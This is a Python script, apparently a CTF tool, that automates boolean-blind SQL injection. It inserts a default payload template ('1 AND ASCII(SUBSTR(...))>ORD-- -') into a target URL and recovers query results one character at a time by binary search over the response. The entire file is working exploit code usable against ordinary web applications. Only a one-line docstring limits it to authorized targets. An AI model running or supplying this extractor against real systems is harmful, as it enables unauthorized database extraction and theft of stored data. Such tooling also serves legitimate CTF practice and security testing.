#!/usr/bin/env python3
"""Boolean blind SQLi extractor for CTF targets.

Use only against authorized CTF infrastructure. The URL must contain INJECT.
Default extraction uses binary search over printable ASCII and a true marker.
"""

import argparse
import requests


def render(template: str, expr: str, pos: int, mid: int) -> str:
    return template.replace("EXPR", expr).replace("POS", str(pos)).replace("ORD", str(mid))


def is_true(session, url, payload, marker, cookie, header):
    target = url.replace("INJECT", requests.utils.quote(payload, safe="()'\"=<>-*/, "))
    r = session.get(target, cookies=cookie, headers=header, timeout=10)
    if marker is not None:
        return marker in r.text, len(r.text), r.status_code
    return r.status_code == 200 and len(r.text) > 0, len(r.text), r.status_code


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="URL containing INJECT placeholder")
    ap.add_argument("--expr", required=True, help="SQL expression returning text, e.g. SELECT database()")
    ap.add_argument("--template", default="1 AND ASCII(SUBSTR((EXPR),POS,1))>ORD-- -")
    ap.add_argument("--true", dest="marker", help="String present when predicate is true")
    ap.add_argument("--max-len", type=int, default=80)
    ap.add_argument("--charset-low", type=int, default=32)
    ap.add_argument("--charset-high", type=int, default=126)
    ap.add_argument("--cookie", action="append", default=[], help="Cookie k=v, repeatable")
    ap.add_argument("--header", action="append", default=[], help="Header k:v, repeatable")
    args = ap.parse_args()

    cookie = dict(x.split("=", 1) for x in args.cookie)
    header = dict(x.split(":", 1) for x in args.header)
    session = requests.Session()
    out = ""

    for pos in range(1, args.max_len + 1):
        lo, hi = args.charset_low, args.charset_high
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = render(args.template, args.expr, pos, mid)
            truth, size, status = is_true(session, args.url, payload, args.marker, cookie, header)
            if truth:
                lo = mid + 1
            else:
                hi = mid - 1
        ch = chr(lo)
        if lo < args.charset_low or lo > args.charset_high:
            break
        out += ch
        print(repr(out), flush=True)


if __name__ == "__main__":
    main()

